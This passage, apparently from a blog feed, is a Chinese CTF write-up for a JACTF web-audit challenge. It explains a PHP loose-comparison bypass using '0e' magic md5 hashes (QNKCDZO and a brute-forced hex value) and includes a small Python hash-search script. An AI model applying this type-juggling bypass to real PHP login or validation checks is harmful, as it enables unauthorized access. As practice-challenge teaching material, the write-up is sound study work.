fclose($fh);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'test01'</span>. urlencode(readmyfile(<span class="string">"test01.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'test00'</span>. urlencode(readmyfile(<span class="string">"test00.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'test10'</span>. urlencode(readmyfile(<span class="string">"test10.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'test11'</span>. urlencode(readmyfile(<span class="string">"test11.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webaudit_1.png" alt></p><p><strong>第二部分</strong></p><ol><li>a是大写字母，b是数字且长度不大于6</li><li>GET得到的m和n的长度不大于4</li><li>str8为a的md5值</li><li>str9为b的md5值中的<strong>字符</strong>m替换为n</li><li>($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6)，b长度必须为6，a不等于6，a的md5和b的md5替换后的值相同</li></ol><p>这里使用0e绕过，a的值很明显为QNKCDZO</p><p>b的值可以利用这个替换，将一些可能的值替换为我们需要的，is_numeric()函数接受16进制，会把16进制认为是数字，写个脚本找出0e开头的十六进制，然后找出有不大于5个字母数的md5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>,<span class="number">10000</span>):</span><br><span class="line">k = <span class="string">"0x"</span>+str(i)</span><br><span class="line"></span><br><span class="line">md5_n = hashlib.md5(k.encode()).hexdigest()</span><br><span class="line"><span class="keyword">if</span> md5_n[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">"0e"</span>:</span><br><span class="line">print(k)</span><br><span class="line">print(md5_n)</span><br></pre></td></tr></table></figure><p>结果如图，选择0x6156   0ec4899c94ada8d08a6ada8623c6ff01</p><p><img src="http://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webaudit_2.png" alt></p><p>构造payload：</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webaudit_3.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;平台已不运营&lt;/p&gt;
&lt;h2 id=&quot;Web签到&quot;&gt;&lt;a href=&quot;#Web签到&quot; class=&quot;headerlink&quot; title=&quot;Web签到&quot;&gt;&lt;/a&gt;Web签到&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://wcgimages.oss-cn-shenzhen.
      
    
    </summary>
    
      <category term="CTF wp" scheme="http://yoursite.com/categories/CTF-wp/"/>
    
    
      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
    
      <category term="JACTF" scheme="http://yoursite.com/tags/JACTF/"/>
    
  </entry>
  
</feed>
